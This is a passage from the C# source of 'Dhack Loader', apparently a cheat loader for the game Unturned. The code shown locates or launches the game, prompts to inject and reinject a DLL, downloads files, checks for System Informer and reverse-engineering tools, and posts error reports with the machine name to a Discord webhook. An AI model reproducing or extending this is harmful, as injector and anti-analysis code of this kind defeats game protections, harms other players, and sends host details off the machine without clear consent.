                Console.WriteLine(string.Format(GetLanguageValue(language, "DownloadFailed"), ex.Message));
                Console.ResetColor();
                return false;
            }
        }

        private static void UpdateProgressBar(int percentage)
        {
            Console.CursorLeft = 0;
            Console.Write("[");
            Console.CursorLeft = 32;
            Console.Write("]");
            Console.CursorLeft = 1;
            float oneChunk = 30.0f / 100;
            int position = 1;
            for (int i = 0; i < oneChunk * percentage; i++)
            {
                Console.BackgroundColor = ConsoleColor.DarkCyan;
                Console.CursorLeft = position++;
                Console.Write(" ");
            }
            for (int i = position; i <= 31; i++)
            {
                Console.BackgroundColor = ConsoleColor.Black;
                Console.CursorLeft = position++;
                Console.Write(" ");
            }
            Console.CursorLeft = 35;
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Write($"{percentage}%");
        }

        private static Process GetTargetProcess(string processName)
        {
            Process[] processes = Process.GetProcessesByName(processName);
            return processes.Length > 0 ? processes[0] : null;
        }

        private static void CleanupOldFiles(string[] paths, bool debugMode)
        {
            foreach (string path in paths)
            {
                try { if (File.Exists(path)) { if (debugMode) { Logger.Log($"Cleaning up: {path}", ConsoleColor.DarkGray); } File.Delete(path); } } catch { }
            }
        }

        private static async Task SendErrorToDiscord(string errorType, string errorMessage, bool debugMode)
        {
            try
            {
                using HttpClient client = new();
                var embed = new { title = $"❌ {errorType}", description = errorMessage, color = 16711680, timestamp = DateTime.UtcNow.ToString("o"), footer = new { text = $"Dhack Loader v{GetAssemblyVersion()}" }, author = new { name = Environment.MachineName } };
                var payload = new { username = "Dhack Error Reporter", embeds = new[] { embed } };
                using MultipartFormDataContent content = new() { { new StringContent(JsonConvert.SerializeObject(payload)), "payload_json" } };
                HttpResponseMessage response = await client.PostAsync(GetDiscordWebhookUrl(), content).ConfigureAwait(false);
                if (!response.IsSuccessStatusCode && debugMode)
                {
                    Console.WriteLine($"[ERROR] Failed to send request: {response.StatusCode}, Response: {await response.Content.ReadAsStringAsync().ConfigureAwait(false)}");
                }
            }
            catch (Exception ex) when (debugMode) { Console.WriteLine($"[ERROR] Exception while sending to Discord: {ex.Message}"); }
        }

        private static async Task MonitorProcessAsync(Process process, string language, bool debugMode)
        {
            try
            {
                Stopwatch timer = Stopwatch.StartNew();
                while (!process.HasExited)
                {
                    await Task.Delay(1000).ConfigureAwait(false);
                }

                if (debugMode)
                {
                    Logger.Log($"Process lifetime: {timer.Elapsed.TotalSeconds:F1}s", ConsoleColor.DarkGray);
                }

                if (timer.Elapsed.TotalSeconds < 25)
                {
                    Logger.Log(string.Format(GetLanguageValue(language, "ProcessClosedEarly"), process.ProcessName), ConsoleColor.Red);
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine(GetLanguageValue(language, "RestartPrompt"));
                    string input = Console.ReadLine()?.Trim().ToLower();
                    if (input is "y" or "yes" or "д" or "да")
                    {
                        RestartApplication(language);
                    }

                    Console.WriteLine(GetLanguageValue(language, "ReinjectPrompt"));
                    input = Console.ReadLine()?.Trim().ToLower();
                    if (input is "y" or "yes" or "д" or "да")
                    {
                        await RunInjectorAsync(debugMode, language, "").ConfigureAwait(false);
                    }
                }
            }
            catch { }
        }

        private static void RestartApplication(string language)
        {
            List<string> possiblePaths = GetPossibleExecutablePaths();
            string validPath = possiblePaths.FirstOrDefault(File.Exists);
            if (validPath == null) { Logger.Log(string.Format(GetLanguageValue(language, "ExeNotFoundMultiple"), string.Join("\n", possiblePaths)), ConsoleColor.Red); return; }
            try
            {
                Logger.Log(GetLanguageValue(language, "Restarting"), ConsoleColor.Blue);
                _ = Process.Start(new ProcessStartInfo { FileName = validPath, UseShellExecute = true });
                Logger.Log(GetLanguageValue(language, "RestartedSuccessfully"), ConsoleColor.Green);
            }
            catch (Exception ex) { Logger.Log($"Restart failed: {ex.Message}", ConsoleColor.Red); }
        }

        private static bool ValidateProcess(Process process, string language, bool debugMode)
        {
            try
            {
                // GetProcessById will throw ArgumentException if process doesn't exist
                Process _ = Process.GetProcessById(process.Id);
                return true;
            }
            catch
            {
                Logger.Log(string.Format(GetLanguageValue(language, "ProcessClosedEarly"), "Unturned"), ConsoleColor.Red);
                return false;
            }
        }


        private static void Pause(string language)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(GetLanguageValue(language, "PressAnyKey"));
            Console.ResetColor();
            _ = Console.ReadKey();
        }

        private static List<string> GetPossibleExecutablePaths()
        {
            List<string> paths = [];
            foreach (DriveInfo drive in DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed))
            {
                string[] basePaths = {
                    Path.Combine(drive.Name, "Program Files (x86)", "Steam", "steamapps", "common", "Unturned"),
                    Path.Combine(drive.Name, "Program Files", "Steam", "steamapps", "common", "Unturned"),
                    Path.Combine(drive.Name, "SteamLibrary", "steamapps", "common", "Unturned")
                };
                foreach (string basePath in basePaths)
                {
                    paths.Add(Path.Combine(basePath, "Unturned.exe"));
                }
            }
            return paths;
        }
        private static class LanguageKeys
        {
            // Common
            public const string AdminRequired = "AdminRequired";
            public const string WelcomeMessage = "WelcomeMessage";
            public const string DebugPasswordPrompt = "DebugPasswordPrompt";
            public const string DebugModeEnabled = "DebugModeEnabled";
            public const string DebugModeDisabled = "DebugModeDisabled";
            public const string PressAnyKey = "PressAnyKey";
            public const string LanguagePrompt = "LanguagePrompt";
            public const string InvalidChoice = "InvalidChoice";

            // Process
            public const string ProcessNotFound = "ProcessNotFound";
            public const string ExeNotFound = "ExeNotFound";
            public const string ExeNotFoundMultiple = "ExeNotFoundMultiple";
            public const string ProcessStartFailed = "ProcessStartFailed";
            public const string ProcessStarted = "ProcessStarted";
            public const string ProcessInitFailed = "ProcessInitFailed";
            public const string ProcessFound = "ProcessFound";


            // Injection
            public const string LoadingDll = "LoadingDll";
            public const string User = "User";
            public const string Machine = "Machine";
            public const string FailedDebugAttempt = "FailedDebugAttempt";
            public const string DllNotFound = "DllNotFound";
            public const string DllFound = "DllFound";
            public const string InjectionSuccess = "InjectionSuccess";
            public const string PreparingInjection = "PreparingInjection";
            public const string LookingForProcess = "LookingForProcess";

            // Security
            public const string SuspendDetected = "SuspendDetected";
            public const string SystemInformerDetected = "SystemInformerDetected";
            public const string SecurityAlert = "SecurityAlert";
            public const string ReverseEngineeringToolsDetected = "ReverseEngineeringToolsDetected";

            // UI
            public const string AsciiArt = "AsciiArt";
            public const string RestartPrompt = "RestartPrompt";
            public const string ReinjectPrompt = "ReinjectPrompt";
            public const string DownloadingFile = "DownloadingFile";
            public const string DownloadComplete = "DownloadComplete";
            public const string DownloadFailed = "DownloadFailed";
        }

        private static readonly Dictionary<string, Dictionary<string, string>> Languages = new()
        {
            {
                "English", new Dictionary<string, string>
                {
                    { LanguageKeys.AdminRequired, "[WARNING] Please run as Administrator!" },
                    { LanguageKeys.WelcomeMessage, "[INFO] Made by zanzyt with <3!" },
                    { LanguageKeys.DebugPasswordPrompt, "[PROMPT] Debug password:" },
                    { LanguageKeys.DebugModeEnabled, "[INFO] Debug mode enabled!" },
                    { LanguageKeys.DebugModeDisabled, "[INFO] Debug mode disabled!" },
                    { LanguageKeys.PressAnyKey, "[PROMPT] Press any key..." },
                    { LanguageKeys.LanguagePrompt, "Choose language:\n1. English\n2. Русский\n>" },
                    { LanguageKeys.InvalidChoice, "[WARNING] Invalid choice!" },

                    { LanguageKeys.ProcessNotFound, "[INFO] Target process not found: {0}. Attempting to launch..." },
                    { LanguageKeys.ExeNotFound, "[ERROR] Executable not found at: {0}" },
                    { LanguageKeys.ExeNotFoundMultiple, "[ERROR] Executable not found in standard locations:\n{0}" },
                    { LanguageKeys.ProcessStartFailed, "[ERROR] Failed to start process." },
                    { LanguageKeys.ProcessStarted, "[INFO] Process started (ID: {0}). Waiting..." },
                    { LanguageKeys.ProcessInitFailed, "[ERROR] Failed to find process after launch." },
                    { LanguageKeys.ProcessFound, "[INFO] Target process found: {0} (ID: {1})" },


                    { LanguageKeys.AsciiArt,
                    @"
_______      ___    ___ ________  ___       ________  ___  _________        ___  ___  ___  ___  ________     
|\  ___ \    |\  \  /  /|\   __  \|\  \     |\   __  \|\  \|\___   ___\     |\  \|\  \|\  \|\  \|\   __  \    
\ \   __/|   \ \  \/  / | \  \|\  \ \  \    \ \  \|\  \ \  \|___ \  \_|     \ \  \\\  \ \  \\\  \ \  \|\ /_   
 \ \  \_|/__  \ \    / / \ \   ____\ \  \    \ \  \\\  \ \  \   \ \  \       \ \   __  \ \  \\\  \ \   __  \  
  \ \  \_|\ \  /     \/   \ \  \___|\ \  \____\ \  \\\  \ \  \   \ \  \       \ \  \ \  \ \  \\\  \ \  \|\  \ 
   \ \_______\/  /\   \    \ \__\    \ \_______\ \_______\ \__\   \ \__\       \ \__\ \__\ \_______\ \_______\
    \|_______/__/ /\ __\    \|__|     \|_______|\|_______|\|__|    \|__|        \|__|\|__|\|_______|\|_______|
             |__|/ \|__|                                                                                      
                                                                                                              
                                                                                                              " },

                    { LanguageKeys.DllNotFound, "[ERROR] DLL not found at: {0}" },
                    { LanguageKeys.DllFound, "[INFO] DLL found at: {0}" },
                    { LanguageKeys.InjectionSuccess, "[SUCCESS] DLL injected successfully!" },
                    { LanguageKeys.PreparingInjection, "[INFO] Preparing to inject {0}..." },
                    { LanguageKeys.LookingForProcess, "[INFO] Looking for {0} process..." },

                    { LanguageKeys.SuspendDetected, "[SECURITY] Suspicious activity detected!" },
                    { LanguageKeys.SystemInformerDetected, "[SECURITY] System Informer detected!" },
                    { LanguageKeys.SecurityAlert, "[SECURITY] {0}" },
                    { LanguageKeys.ReverseEngineeringToolsDetected, "[SECURITY] Tools detected: {0}" },

                    { LanguageKeys.RestartPrompt, "[PROMPT] Restart process? (Y/N)" },
                    { LanguageKeys.ReinjectPrompt, "[PROMPT] Reinject DLL? (Y/N)" },
                    { LanguageKeys.DownloadingFile, "[INFO] Downloading: {0}" },
                    { LanguageKeys.DownloadComplete, "[SUCCESS] {0} downloaded!" },
                    { LanguageKeys.DownloadFailed, "[ERROR] Download failed: {0}" },
                }
            },
            {
                "Russian", new Dictionary<string, string>
                {
                    { LanguageKeys.AdminRequired, "[ПРЕДУПРЕЖДЕНИЕ] Запустите от Администратора!" },
                    { LanguageKeys.WelcomeMessage, "[ИНФО] От занзyта с любовью <3!" },
                    { LanguageKeys.DebugPasswordPrompt, "[ВВОД] Пароль отладки:" },
                    { LanguageKeys.DebugModeEnabled, "[ИНФО] Режим отладки включён!" },
                    { LanguageKeys.DebugModeDisabled, "[ИНФО] Режим отладки выключен!" },
                    { LanguageKeys.PressAnyKey, "[ВВОД] Нажмите любую клавишу..." },
                    { LanguageKeys.LanguagePrompt, "Выберите язык:\n1. English\n2. Русский\n>" },
                    { LanguageKeys.InvalidChoice, "[ОШИБКА] Неверный выбор!" },

                    { LanguageKeys.AsciiArt,
                    @"
_______      ___    ___ ________  ___       ________  ___  _________        ___  ___  ___  ___  ________     
|\  ___ \    |\  \  /  /|\   __  \|\  \     |\   __  \|\  \|\___   ___\     |\  \|\  \|\  \|\  \|\   __  \    
\ \   __/|   \ \  \/  / | \  \|\  \ \  \    \ \  \|\  \ \  \|___ \  \_|     \ \  \\\  \ \  \\\  \ \  \|\ /_   
 \ \  \_|/__  \ \    / / \ \   ____\ \  \    \ \  \\\  \ \  \   \ \  \       \ \   __  \ \  \\\  \ \   __  \  
  \ \  \_|\ \  /     \/   \ \  \___|\ \  \____\ \  \\\  \ \  \   \ \  \       \ \  \ \  \ \  \\\  \ \  \|\  \ 
   \ \_______\/  /\   \    \ \__\    \ \_______\ \_______\ \__\   \ \__\       \ \__\ \__\ \_______\ \_______\
    \|_______/__/ /\ __\    \|__|     \|_______|\|_______|\|__|    \|__|        \|__|\|__|\|_______|\|_______|
             |__|/ \|__|                                                                                      
                                                                                                              
                                                                                                              " },

                    { LanguageKeys.ProcessNotFound, "[ИНФО] Процесс не найден: {0}. Запуск..." },
                    { LanguageKeys.ExeNotFound, "[ОШИБКА] Файл не найден: {0}" },
                    { LanguageKeys.ExeNotFoundMultiple, "[ОШИБКА] Файл не найден в стандартных папках:\n{0}" },
                    { LanguageKeys.ProcessStartFailed, "[ОШИБКА] Не удалось запустить процесс." },
                    { LanguageKeys.ProcessStarted, "[ИНФО] Процесс запущен (ID: {0}). Ожидание..." },
                    { LanguageKeys.ProcessInitFailed, "[ОШИБКА] Не удалось найти процесс после запуска." },
                    { LanguageKeys.ProcessFound, "[ИНФО] Найден процесс: {0} (ID: {1})" },

                    { LanguageKeys.DllNotFound, "[ОШИБКА] DLL не найдена: {0}" },
                    { LanguageKeys.DllFound, "[ИНФО] DLL найдена: {0}" },
                    { LanguageKeys.InjectionSuccess, "[УСПЕХ] DLL успешно внедрена!" },
                    { LanguageKeys.PreparingInjection, "[ИНФО] Подготовка к внедрению {0}..." },
                    { LanguageKeys.LookingForProcess, "[ИНФО] Поиск процесса {0}..." },

                    { LanguageKeys.SuspendDetected, "[БЕЗОПАСНОСТЬ] Обнаружена подозрительная активность!" },
                    { LanguageKeys.SystemInformerDetected, "[БЕЗОПАСНОСТЬ] Обнаружен System Informer!" },
                    { LanguageKeys.SecurityAlert, "[БЕЗОПАСНОСТЬ] {0}" },
                    { LanguageKeys.ReverseEngineeringToolsDetected, "[БЕЗОПАСНОСТЬ] Обнаружены инструменты: {0}" },

                    { LanguageKeys.RestartPrompt, "[ВОПРОС] Перезапустить процесс? (Д/Н)" },
                    { LanguageKeys.ReinjectPrompt, "[ВОПРОС] Повторить инъекцию? (Д/Н)" },
                    { LanguageKeys.DownloadingFile, "[ИНФО] Загрузка: {0}" },
                    { LanguageKeys.DownloadComplete, "[УСПЕХ] {0} загружен!" },
                    { LanguageKeys.DownloadFailed, "[ОШИБКА] Ошибка загрузки: {0}" }
                }
            }
        };
    }
}

